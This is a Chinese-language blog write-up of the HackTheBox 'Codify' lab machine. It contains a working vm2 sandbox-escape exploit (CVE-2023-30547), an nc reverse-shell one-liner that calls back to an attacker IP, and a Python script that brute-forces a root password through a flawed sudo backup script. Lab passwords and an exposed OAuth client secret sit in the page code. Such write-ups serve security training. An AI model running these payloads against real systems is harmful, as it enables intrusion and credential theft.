@@ -1,0 +1,324 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackTheBox—Codify靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HackTheBox—Codify靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="打靶训练第八台
+
+信息收集
+nmap扫描
+nmap -sV 10.10.11.239
+
+─# nmap -sV 10.10.11.239
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-..." />
+    <meta name="keywords" content="HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HackTheBox—Codify靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-11-15
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>打靶训练第八台</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115155650637.png" alt="image-20231115155650637" loading="lazy"></figure>
+<h2 id="信息收集">信息收集</h2>
+<p>nmap扫描</p>
+<pre><code>nmap -sV 10.10.11.239
+</code></pre>
+<pre><code>─# nmap -sV 10.10.11.239
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-15 16:00 CST
+Nmap scan report for codify.htb (10.10.11.239)
+Host is up (0.30s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.52
+3000/tcp open  http    Node.js Express framework
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds
+</code></pre>
+<p>扫描出来得到开放了 22 80 3000端口</p>
+<h2 id="cve-2023-30547">CVE-2023-30547</h2>
+<p>还是在本地修改hosts文件</p>
+<p>然后访问对应的域名</p>
+<p>Codify.htb</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115160448698.png" alt="image-20231115160448698" loading="lazy"></figure>
+<p>点击try</p>
+<p>尝试输入命令 返回错误。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115160532424.png" alt="image-20231115160532424" loading="lazy"></figure>
+<p>点击about us得到一些信息</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115160726025.png" alt="image-20231115160726025" loading="lazy"></figure>
+<p>点击蓝色的VM 2得到在github的地址 且指出了版本信息。</p>
+<p>google search</p>
+<p>VM2 3.9.16 EXP</p>
+<p>在网上找到对应的EXP</p>
+<p>https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</p>
+<pre><code>const {VM} = require(&quot;vm2&quot;);
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+}
+`
+
+console.log(vm.run(code));
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115161035737.png" alt="image-20231115161035737" loading="lazy"></figure>
+<p>验证成功</p>
+<p>在指出的地方插入反弹shell语句。</p>
+<p>https://www.revshells.com/</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.40 6666 &gt;/tmp/f
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115161320677.png" alt="image-20231115161320677" loading="lazy"></figure>
+<h2 id="沙箱逃逸">沙箱逃逸</h2>
+<p>python获取到完整shell</p>
+<pre><code>python3 -c '__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>目前我们还处于一个沙箱环境中，需要移动到真正的用户中。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115161854737.png" alt="image-20231115161854737" loading="lazy"></figure>
+<p>在该目录下得到名为tickets的db文件 查看得到带有joshua hash密码的值。</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115162011617.png" alt="image-20231115162011617" loading="lazy"></figure>
+<p>使用john破解得到密码为 <strong>spongebob1</strong>。</p>
+<p>再起一个终端进行SSH连接。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115162136883.png" alt="image-20231115162136883" loading="lazy"></figure>
+<p>突破到真实环境中。</p>
+<h2 id="权限提升">权限提升</h2>
+<p>现在尝试提权操作。</p>
+<p>我的思路是 内核（脏牛）-&gt;SUDO-&gt;SUID-&gt;计划任务没有成功后</p>
+<p>然后在OPT 目录下找到了msql的一个 sh程序</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115163051499.png" alt="image-20231115163051499" loading="lazy"></figure>
+<p>执行这个程序的话需要输入root用户的密码，我们可以写一个脚本然后让脚本自动化去执行，最终得出密码。</p>
+<pre><code>import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = &quot;&quot;
+found = False
+
+while not found:
+    for character in all:
+        command = f&quot;echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh&quot;
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if &quot;Password confirmed!&quot; in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+</code></pre>
+<p>这段代码是一个国外的一个师傅写的。他在完成这个靶机后也将这个文件上传在了/TMP目录下。</p>
+<p>最后得到密码为 <strong>kljh12k3jhaskjh12kjh3</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231115163914071.png" alt="image-20231115163914071" loading="lazy"></figure>
+<h2 id="小结">小结</h2>
+<p>CVE得到反弹shell进入沙箱环境 通过配置文件得到joshua的密码 使用pyhotn编写密码破解得到root账号密码。我感觉还是比较简单的，主要在于细心寻找收集配置文件泄露的信息</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#cve-2023-30547">CVE-2023-30547</a></li>
+<li><a href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">沙箱逃逸</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/vulnhub-earth-ba-ji/">
+              <h3 class="post-title">
+                vulnhub-Earth靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
